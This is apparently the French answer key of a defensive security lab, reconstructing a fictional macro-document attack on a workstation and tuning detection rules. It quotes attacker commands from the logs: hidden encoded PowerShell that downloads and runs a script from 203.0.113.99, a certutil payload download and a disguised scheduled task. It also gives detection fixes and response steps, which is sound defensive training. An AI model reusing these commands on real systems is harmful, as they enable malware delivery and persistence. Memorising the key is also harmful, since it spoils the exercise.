# Corrigé : arbre de processus et réglage des règles

## L'attaque sur WKS-0113 (n.diallo)
1. **10:14:07** `OUTLOOK.EXE` ouvert par l'utilisatrice.
2. **10:17:19** `WINWORD.EXE` ouvre `Invoice_8841.docm`, depuis le cache des pièces jointes d'Outlook. Un **.docm** contient des macros.
3. **10:17:28** Word lance `cmd.exe /c powershell -nop -w hidden -enc …`. Un document Word n'a aucune raison de lancer cmd : **c'est la macro qui s'exécute**.
4. **10:17:29** PowerShell, fenêtre cachée, exécute `IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.99/a.ps1')` : il télécharge un script et l'exécute **en mémoire**.
5. **10:17:35** `certutil -urlcache -split -f http://203.0.113.99/p.exe C:\Users\Public\p.exe` : un outil Windows légitime détourné pour télécharger (LOLBin).
6. **10:17:39** `p.exe` démarre depuis `C:\Users\Public` ; à **10:17:54**, il crée la tâche `OneDrive Standalone Update` au logon : de la **persistance** déguisée en OneDrive.

## SCCM : supprimer, pas effacer
L'alerte reste visible avec la raison, le propriétaire et la date de revue, pour garder une trace et pouvoir réévaluer. L'exception exige **les trois** conditions : parent `CcmExec.exe`, utilisateur SYSTEM, **et** un contenu décodé contenant `Get-HotFix`. Un attaquant qui lancerait son propre code encodé, même en SYSTEM, ne passe pas (testé dans `test_allowlist_is_narrow`).

## WKS-0119 : le trou de la règle
`ENCODED_POWERSHELL` vérifie `Image` = powershell.exe. Le fichier s'appelle `svch0st.exe` (avec un zéro), donc la règle ne regarde même pas la ligne de commande. **Correction en une ligne :** tester aussi `OriginalFileName` :
```python
if img in ("powershell.exe", "pwsh.exe") or ev.get("OriginalFileName", "").lower() in ("powershell.exe", "pwsh.dll"):
```
Test à ajouter : une alerte `ENCODED_POWERSHELL` sur WKS-0119, avec le contenu décodé `Start-Process ... upd.exe`.

## Le filtre Sigma est trop large
`filter_sccm` exclut **tout** PowerShell encodé lancé par CcmExec en SYSTEM, sans regarder le contenu. Si un attaquant pousse un script via SCCM, ou abuse du client, il devient invisible. Correction : ajouter une condition sur la ligne de commande exacte attendue, ou sur le hash du script. Et faire revoir l'exception régulièrement.

## Les 15 premières minutes sur WKS-0113
1. **Isoler** le poste via l'EDR (il garde le contact avec la console).
2. Récupérer `p.exe` (hash, échantillon), puis tuer le processus et **supprimer la tâche planifiée**.
3. Bloquer 203.0.113.99 (proxy, pare-feu, DNS) et **chercher l'IP et le hash sur tous les postes**. 203.0.113.99 apparaît aussi dans les labs 05 et 06 : c'est la même campagne fictive.
4. Purger l'email `Invoice_8841.docm` de toutes les boîtes (lab 04).
5. Réinitialiser les identifiants de n.diallo et vérifier ses connexions récentes.
